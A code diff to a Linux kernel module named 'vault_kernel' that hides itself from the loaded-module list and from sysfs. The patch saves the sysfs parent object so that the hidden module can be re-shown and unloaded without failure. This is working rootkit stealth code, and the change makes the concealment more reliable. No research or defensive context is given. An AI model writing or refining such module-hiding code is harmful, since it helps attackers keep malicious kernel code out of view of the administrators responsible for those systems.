@@ -6,6 +6,7 @@
 #include "core.h"
 
 static struct list_head *saved_module_list = NULL;
+static struct kobject *saved_parent = NULL;
 
 int stealth_hide_module(void) {
     if (module_hidden)
@@ -21,7 +22,9 @@ int stealth_hide_module(void) {
     THIS_MODULE->list.next = LIST_POISON1;
     THIS_MODULE->list.prev = LIST_POISON2;
 
-    /* Remove reference in sysfs */
+    /* Remove reference in sysfs — kobject_del() may clear kobj.parent
+     * on some kernel versions, so save it BEFORE deleting. */
+    saved_parent = THIS_MODULE->mkobj.kobj.parent;
     kobject_del(&THIS_MODULE->mkobj.kobj);
 
     module_hidden = 1;
@@ -36,8 +39,8 @@ int stealth_unhide_module(void) {
     /* Re-insert into module list */
     list_add(&THIS_MODULE->list, saved_module_list);
 
-    /* Re-add to sysfs */
-    if (kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent,
+    /* Re-add to sysfs using the parent saved at hide time */
+    if (kobject_add(&THIS_MODULE->mkobj.kobj, saved_parent,
                      "vault_kernel")) {
         pr_warn(VAULT_KERNEL_TAG " failed to re-add kobject\n");
     }
@@ -57,7 +60,7 @@ void stealth_cleanup(void) {
         /* Must re-add before rmmod or kernel will panic */
         list_add(&THIS_MODULE->list, saved_module_list);
         if (kobject_add(&THIS_MODULE->mkobj.kobj,
-                         THIS_MODULE->mkobj.kobj.parent, "vault_kernel")) {
+                         saved_parent, "vault_kernel")) {
             /* Continue anyway */
         }
         module_hidden = 0;
